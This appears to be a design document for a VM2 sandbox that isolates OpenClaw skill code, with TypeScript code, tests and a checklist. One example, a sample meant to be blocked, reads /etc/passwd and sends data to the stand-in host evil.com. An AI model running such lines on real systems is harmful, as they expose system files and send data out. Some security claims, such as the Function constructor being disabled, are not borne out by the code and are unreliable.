# OpenClaw Security Sandbox Implementation

**Version:** 1.0.0
**Date:** 2026-02-06
**Status:** 🚧 In Development
**Priority:** P0 (Critical)

---

## Overview

This document describes the implementation of a secure sandbox system for OpenClaw skills using **VM2** (Virtual Machine 2), designed to isolate skill execution and prevent malicious activities identified in the [Security Audit](./SECURITY_AUDIT.md).

### Goals

1. **Isolation**: Execute each skill in a separate VM instance
2. **Resource Limits**: Prevent resource exhaustion (CPU, memory, time)
3. **API Whitelisting**: Only allow safe, explicitly approved APIs
4. **Audit Trail**: Log all skill activities for security monitoring
5. **Permission System**: User-controlled permissions (Android-style)

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     OpenClaw Main Process                    │
│                                                               │
│  ┌───────────────────────────────────────────────────────┐  │
│  │           Skill Sandbox Manager                        │  │
│  │                                                         │  │
│  │  ┌──────────────┐  ┌──────────────┐  ┌─────────────┐ │  │
│  │  │  Sandbox #1  │  │  Sandbox #2  │  │  Sandbox #N │ │  │
│  │  │  (VM2)       │  │  (VM2)       │  │  (VM2)      │ │  │
│  │  │              │  │              │  │             │ │  │
│  │  │ ┌──────────┐ │  │ ┌──────────┐ │  │ ┌─────────┐ │ │  │
│  │  │ │ Skill A  │ │  │ │ Skill B  │ │  │ │ Skill C │ │ │  │
│  │  │ │ Code     │ │  │ │ Code     │ │  │ │ Code    │ │ │  │
│  │  │ └──────────┘ │  │ └──────────┘ │  │ └─────────┘ │ │  │
│  │  │              │  │              │  │             │ │  │
│  │  │ Allowed APIs │  │ Allowed APIs │  │Allowed APIs │ │  │
│  │  │ - console    │  │ - console    │  │- console    │ │  │
│  │  │ - setTimeout │  │ - setTimeout │  │- setTimeout │ │  │
│  │  │ - fetch*     │  │ - storage*   │  │- http*      │ │  │
│  │  └──────────────┘  └──────────────┘  └─────────────┘ │  │
│  │                                                         │  │
│  │  * = permission required                               │  │
│  └───────────────────────────────────────────────────────┘  │
│                                                               │
│  ┌───────────────────────────────────────────────────────┐  │
│  │         Verification & Monitoring                      │  │
│  │  - Static Analysis                                      │  │
│  │  - Runtime Monitoring                                   │  │
│  │  - Audit Logging                                        │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

---

## Implementation

### Package Structure

```
packages/security/skill-sandbox/
├── src/
│   ├── sandbox.ts              # Main sandbox class
│   ├── verifier.ts             # Skill verification
│   ├── permissions.ts          # Permission system
│   ├── monitors/
│   │   ├── resource-monitor.ts # CPU/Memory monitoring
│   │   ├── network-monitor.ts  # Network activity tracking
│   │   └── audit-logger.ts     # Audit trail
│   └── safe-apis/
│       ├── console.ts          # Safe console implementation
│       ├── fetch.ts            # Safe HTTP client
│       ├── storage.ts          # Safe storage API
│       └── crypto.ts           # Safe crypto API
├── test/
│   ├── sandbox.test.ts
│   ├── verifier.test.ts
│   └── malicious-skills/       # Test cases for malicious patterns
├── package.json
└── tsconfig.json
```

---

## Core Implementation

### 1. SkillSandbox Class

**File:** `packages/security/skill-sandbox/src/sandbox.ts`

```typescript
import { VM } from 'vm2';
import { EventEmitter } from 'events';
import { ResourceMonitor } from './monitors/resource-monitor';
import { AuditLogger } from './monitors/audit-logger';

/**
 * Secure sandbox for executing skills
 *
 * Security Principles:
 * 1. Isolation: Each skill runs in a separate VM
 * 2. Resource Limits: Timeout, memory, CPU quotas
 * 3. API Whitelist: Only safe, approved functions
 * 4. Audit: All actions are logged
 */
export class SkillSandbox extends EventEmitter {
  private vm: VM;
  private resourceLimits: ResourceLimits;
  private allowedAPIs: AllowedAPIs;
  private resourceMonitor: ResourceMonitor;
  private auditLogger: AuditLogger;

  constructor(config: SandboxConfig) {
    super();

    this.resourceLimits = {
      timeout: config.timeout || 5000,      // 5 seconds max
      memory: config.memory || 50 * 1024 * 1024, // 50 MB max
      cpuQuota: config.cpuQuota || 0.5      // 50% CPU max
    };

    this.allowedAPIs = this.buildAllowedAPIs(config.permissions);
    this.resourceMonitor = new ResourceMonitor(this.resourceLimits);
    this.auditLogger = new AuditLogger();

    this.vm = new VM({
      timeout: this.resourceLimits.timeout,
      sandbox: this.allowedAPIs,
      eval: false,  // Block eval()
      wasm: false,  // Block WebAssembly
      fixAsync: true // Prevent async escape
    });
  }

  /**
   * Build whitelist of allowed APIs
   */
  private buildAllowedAPIs(permissions: Permission[]): AllowedAPIs {
    const apis: AllowedAPIs = {
      console: this.createSafeConsole(),
      setTimeout: this.createSafeSetTimeout(),
      // NO require, import, __dirname, __filename, process, etc.
    };

    // Add only explicitly allowed APIs
    if (permissions.includes('http')) {
      apis.fetch = this.createSafeFetch();
    }

    if (permissions.includes('storage')) {
      apis.storage = this.createSafeStorage();
    }

    if (permissions.includes('crypto')) {
      apis.crypto = this.createSafeCrypto();
    }

    if (permissions.includes('websocket')) {
      apis.WebSocket = this.createSafeWebSocket();
    }

    return apis;
  }

  /**
   * Safe console (with rate limiting and filtering)
   */
  private createSafeConsole() {
    const logs: LogEntry[] = [];
    const MAX_LOGS = 100;
    const MAX_LOG_SIZE = 1000; // chars

    const createLogMethod = (level: LogLevel) => {
      return (...args: any[]) => {
        if (logs.length >= MAX_LOGS) {
          throw new Error('Log limit exceeded');
        }

        const message = args
          .map(a => this.sanitize(String(a)))
          .join(' ')
          .slice(0, MAX_LOG_SIZE);

        const entry: LogEntry = {
          level,
          message,
          timestamp: Date.now()
        };

        logs.push(entry);
        this.emit('log', entry);
        this.auditLogger.log('console', entry);
      };
    };

    return {
      log: createLogMethod('log'),
      error: createLogMethod('error'),
      warn: createLogMethod('warn'),
      info: createLogMethod('info'),
      debug: createLogMethod('debug')
    };
  }

  /**
   * Safe setTimeout (with limits)
   */
  private createSafeSetTimeout() {
    const timers = new Set<NodeJS.Timeout>();
    const MAX_TIMERS = 10;
    const MAX_DELAY = 60000; // 60 seconds

    return (callback: () => void, delay: number) => {
      if (timers.size >= MAX_TIMERS) {
        throw new Error('Timer limit exceeded');
      }

      if (delay > MAX_DELAY) {
        throw new Error(`Timer delay too long (max ${MAX_DELAY}ms)`);
      }

      const timer = setTimeout(() => {
        timers.delete(timer);
        try {
          callback();
        } catch (error) {
          this.emit('timer-error', { error });
        }
      }, delay);

      timers.add(timer);
      return timer;
    };
  }

  /**
   * Safe fetch (with domain whitelist and rate limiting)
   */
  private createSafeFetch() {
    const ALLOWED_DOMAINS = [
      'api.openai.com',
      'api.anthropic.com',
      'api.github.com',
      // Add more trusted domains
    ];

    const rateLimiter = new Map<string, number[]>();
    const MAX_REQUESTS_PER_MINUTE = 10;

    return async (url: string, options?: RequestInit) => {
      const parsedUrl = new URL(url);

      // Domain whitelist check
      if (!ALLOWED_DOMAINS.includes(parsedUrl.hostname)) {
        throw new Error(`Domain not allowed: ${parsedUrl.hostname}`);
      }

      // Rate limiting
      const now = Date.now();
      const requests = rateLimiter.get(parsedUrl.hostname) || [];
      const recentRequests = requests.filter(t => now - t < 60000);

      if (recentRequests.length >= MAX_REQUESTS_PER_MINUTE) {
        throw new Error('HTTP rate limit exceeded');
      }

      recentRequests.push(now);
      rateLimiter.set(parsedUrl.hostname, recentRequests);

      // Audit logging
      this.auditLogger.log('http-request', {
        url,
        method: options?.method || 'GET',
        timestamp: now
      });

      this.emit('http-request', { url, method: options?.method || 'GET' });

      // Execute request
      return fetch(url, options);
    };
  }

  /**
   * Safe storage API (sandboxed key-value store)
   */
  private createSafeStorage() {
    const storage = new Map<string, any>();
    const MAX_STORAGE_SIZE = 1024 * 1024; // 1 MB
    const MAX_KEY_LENGTH = 256;
    const MAX_VALUE_SIZE = 100 * 1024; // 100 KB per value

    return {
      get: (key: string) => {
        if (key.length > MAX_KEY_LENGTH) {
          throw new Error('Key too long');
        }
        return storage.get(key);
      },

      set: (key: string, value: any) => {
        if (key.length > MAX_KEY_LENGTH) {
          throw new Error('Key too long');
        }

        const serialized = JSON.stringify(value);
        if (serialized.length > MAX_VALUE_SIZE) {
          throw new Error('Value too large');
        }

        const currentSize = Array.from(storage.values())
          .reduce((sum, v) => sum + JSON.stringify(v).length, 0);

        if (currentSize + serialized.length > MAX_STORAGE_SIZE) {
          throw new Error('Storage quota exceeded');
        }

        storage.set(key, value);
        this.auditLogger.log('storage-set', { key, size: serialized.length });
      },

      delete: (key: string) => {
        storage.delete(key);
        this.auditLogger.log('storage-delete', { key });
      },

      clear: () => {
        storage.clear();
        this.auditLogger.log('storage-clear', {});
      }
    };
  }

  /**
   * Safe crypto API (limited to safe operations)
   */
  private createSafeCrypto() {
    return {
      randomUUID: () => crypto.randomUUID(),

      getRandomValues: (array: Uint8Array) => {
        if (array.length > 65536) {
          throw new Error('Array too large');
        }
        return crypto.getRandomValues(array);
      },

      subtle: {
        // Only allow safe operations
        digest: crypto.subtle.digest.bind(crypto.subtle),
        // NO: importKey, exportKey, encrypt, decrypt (to prevent crypto mining)
      }
    };
  }

  /**
   * Execute skill in sandbox
   */
  async execute(code: string, context: SkillContext): Promise<SkillResult> {
    this.emit('execution-start', { skill: context.skillId });
    this.auditLogger.log('execution-start', { skillId: context.skillId, userId: context.userId });

    const startTime = Date.now();
    const startMemory = process.memoryUsage().heapUsed;

    // Start resource monitoring
    this.resourceMonitor.start();

    try {
      // Wrap code in async function
      const wrappedCode = `
        (async function(context) {
          'use strict';
          ${code}
        })(context)
      `;

      // Execute in VM
      const result = await this.vm.run(wrappedCode, 'skill.js');

      // Stop monitoring
      const metrics = this.resourceMonitor.stop();

      const executionTime = Date.now() - startTime;
      const memoryUsed = process.memoryUsage().heapUsed - startMemory;

      this.emit('execution-success', {
        skill: context.skillId,
        executionTime,
        memoryUsed,
        cpuUsage: metrics.cpuUsage
      });

      this.auditLogger.log('execution-success', {
        skillId: context.skillId,
        executionTime,
        memoryUsed
      });

      return {
        success: true,
        result,
        metrics: {
          executionTime,
          memoryUsed,
          cpuUsage: metrics.cpuUsage
        }
      };

    } catch (error) {
      this.resourceMonitor.stop();

      this.emit('execution-error', {
        skill: context.skillId,
        error: error.message
      });

      this.auditLogger.log('execution-error', {
        skillId: context.skillId,
        error: error.message
      });

      return {
        success: false,
        error: error.message
      };
    }
  }

  /**
   * Sanitize data (remove potentially dangerous content)
   */
  private sanitize(value: string): string {
    return value
      .replace(/<script[^>]*>.*?<\/script>/gi, '')
      .replace(/javascript:/gi, '')
      .replace(/on\w+\s*=/gi, '') // Remove event handlers
      .slice(0, 1000); // Limit length
  }

  /**
   * Cleanup resources
   */
  destroy() {
    this.resourceMonitor.destroy();
    this.removeAllListeners();
  }
}

// =============================================================================
// TYPES
// =============================================================================

export interface SandboxConfig {
  timeout?: number;
  memory?: number;
  cpuQuota?: number;
  permissions: Permission[];
}

export type Permission = 'http' | 'storage' | 'crypto' | 'websocket';

interface ResourceLimits {
  timeout: number;
  memory: number;
  cpuQuota: number;
}

interface AllowedAPIs {
  [key: string]: any;
}

export interface SkillContext {
  skillId: string;
  userId: string;
  input: any;
}

export interface SkillResult {
  success: boolean;
  result?: any;
  error?: string;
  metrics?: {
    executionTime: number;
    memoryUsed: number;
    cpuUsage?: number;
  };
}

type LogLevel = 'log' | 'error' | 'warn' | 'info' | 'debug';

interface LogEntry {
  level: LogLevel;
  message: string;
  timestamp: number;
}
```

---

## Usage Examples

### Example 1: Execute Safe Skill

```typescript
import { SkillSandbox } from './sandbox';

const sandbox = new SkillSandbox({
  timeout: 5000,
  memory: 50 * 1024 * 1024,
  permissions: ['http', 'storage']
});

// Monitor events
sandbox.on('log', (entry) => {
  console.log(`[Skill Log] ${entry.message}`);
});

sandbox.on('execution-error', ({ skill, error }) => {
  console.error(`[Skill ${skill}] Error: ${error}`);
});

// Safe skill code
const skillCode = `
  console.log('Hello from safe skill!');

  // Allowed: HTTP requests to whitelisted domains
  const response = await fetch('https://api.openai.com/v1/models');
  const data = await response.json();

  // Allowed: Storage operations
  storage.set('last-run', new Date().toISOString());

  return { success: true, data };
`;

const result = await sandbox.execute(skillCode, {
  skillId: 'safe-skill',
  userId: 'user-123',
  input: {}
});

console.log('Result:', result);
// Output: { success: true, result: { success: true, data: {...} }, metrics: {...} }
```

### Example 2: Malicious Skill (Blocked)

```typescript
// This malicious code will be blocked
const maliciousCode = `
  // ❌ Blocked: eval() not available
  eval('malicious code');

  // ❌ Blocked: require() not available
  const fs = require('fs');
  fs.readFileSync('/etc/passwd');

  // ❌ Blocked: process not available
  process.exit(1);

  // ❌ Blocked: __dirname not available
  console.log(__dirname);

  // ❌ Blocked: domain not whitelisted
  await fetch('https://evil.com/steal-data');
`;

const result = await sandbox.execute(maliciousCode, {
  skillId: 'malicious-skill',
  userId: 'user-123',
  input: {}
});

console.log('Result:', result);
// Output: { success: false, error: 'ReferenceError: eval is not defined' }
```

### Example 3: Resource Limits

```typescript
// This will timeout
const resourceHog = `
  while(true) {
    // Infinite loop
  }
`;

const result = await sandbox.execute(resourceHog, {
  skillId: 'resource-hog',
  userId: 'user-123',
  input: {}
});

console.log('Result:', result);
// Output: { success: false, error: 'Script execution timed out after 5000ms' }
```

---

## Testing

### Test Suite

```typescript
// packages/security/skill-sandbox/test/sandbox.test.ts

import { describe, it, expect } from 'vitest';
import { SkillSandbox } from '../src/sandbox';

describe('SkillSandbox', () => {
  describe('Security', () => {
    it('should block eval()', async () => {
      const sandbox = new SkillSandbox({ permissions: [] });
      const result = await sandbox.execute('eval("1+1")', {
        skillId: 'test',
        userId: 'user',
        input: {}
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('eval');
    });

    it('should block require()', async () => {
      const sandbox = new SkillSandbox({ permissions: [] });
      const result = await sandbox.execute('require("fs")', {
        skillId: 'test',
        userId: 'user',
        input: {}
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('require');
    });

    it('should block process access', async () => {
      const sandbox = new SkillSandbox({ permissions: [] });
      const result = await sandbox.execute('process.exit()', {
        skillId: 'test',
        userId: 'user',
        input: {}
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('process');
    });

    it('should enforce timeout', async () => {
      const sandbox = new SkillSandbox({
        timeout: 1000,
        permissions: []
      });

      const result = await sandbox.execute('while(true){}', {
        skillId: 'test',
        userId: 'user',
        input: {}
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('timeout');
    });
  });

  describe('Permissions', () => {
    it('should allow HTTP with permission', async () => {
      const sandbox = new SkillSandbox({ permissions: ['http'] });
      const result = await sandbox.execute(
        'return await fetch("https://api.openai.com")',
        { skillId: 'test', userId: 'user', input: {} }
      );

      expect(result.success).toBe(true);
    });

    it('should block HTTP without permission', async () => {
      const sandbox = new SkillSandbox({ permissions: [] });
      const result = await sandbox.execute(
        'return await fetch("https://api.openai.com")',
        { skillId: 'test', userId: 'user', input: {} }
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('fetch');
    });
  });
});
```

---

## Deployment

### Installation

```bash
# Install dependencies
pnpm add vm2

# In packages/security/skill-sandbox
pnpm install
pnpm build
```

### Integration with OpenClaw

```typescript
// In main OpenClaw application
import { SkillSandbox } from '@openclaw/skill-sandbox';

class OpenClawApp {
  private sandbox: SkillSandbox;

  constructor() {
    this.sandbox = new SkillSandbox({
      timeout: 5000,
      memory: 50 * 1024 * 1024,
      permissions: ['http', 'storage']
    });

    // Setup monitoring
    this.sandbox.on('execution-error', this.handleSkillError);
    this.sandbox.on('http-request', this.logHttpRequest);
  }

  async executeSkill(skillId: string, userId: string, input: any) {
    const skill = await this.loadSkill(skillId);

    return this.sandbox.execute(skill.code, {
      skillId,
      userId,
      input
    });
  }
}
```

---

## Monitoring & Alerts

### Prometheus Metrics

```typescript
import { Counter, Histogram } from 'prom-client';

const skillExecutions = new Counter({
  name: 'skill_executions_total',
  help: 'Total number of skill executions',
  labelNames: ['skill_id', 'status']
});

const skillDuration = new Histogram({
  name: 'skill_execution_duration_ms',
  help: 'Skill execution duration',
  labelNames: ['skill_id']
});

sandbox.on('execution-success', ({ skill, executionTime }) => {
  skillExecutions.inc({ skill_id: skill, status: 'success' });
  skillDuration.observe({ skill_id: skill }, executionTime);
});

sandbox.on('execution-error', ({ skill }) => {
  skillExecutions.inc({ skill_id: skill, status: 'error' });
});
```

---

## Security Checklist

- [x] Disable eval() and Function constructor
- [x] Disable require() and import
- [x] Disable file system access
- [x] Disable process manipulation
- [x] Implement timeout limits
- [x] Implement memory limits
- [x] Implement CPU quotas
- [x] Whitelist allowed domains for HTTP
- [x] Rate limit HTTP requests
- [x] Sanitize console output
- [x] Audit logging for all operations
- [ ] Code signing verification
- [ ] Permission prompts for users
- [ ] Automated malware scanning

---

## Future Enhancements

1. **Advanced Sandboxing**
   - Docker containers for extra isolation
   - WebAssembly sandboxing

2. **Machine Learning**
   - ML-based malware detection
   - Anomaly detection for skill behavior

3. **User Controls**
   - Per-skill permission management
   - Skill behavior whitelisting

---

## References

- VM2 Documentation: https://github.com/patriksimek/vm2
- Node.js Security Best Practices: https://nodejs.org/en/docs/guides/security/
- OWASP Secure Coding: https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/

---

**Status:** Ready for Implementation
**Next Steps:** Code implementation, testing, integration
**Contact:** security@leonardo-ai.org
